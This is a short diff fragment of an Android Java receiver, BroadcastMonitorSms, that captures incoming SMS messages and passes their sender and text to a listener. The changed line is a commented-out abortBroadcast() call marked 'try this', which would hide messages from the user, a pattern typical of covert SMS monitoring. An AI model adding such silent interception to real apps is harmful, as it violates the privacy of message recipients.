@@ -40,7 +40,7 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), false));
 			
 			// TODO provare questa
-			// abortBroadcast();
+			//abortBroadcast();
 		}
 	}
 }
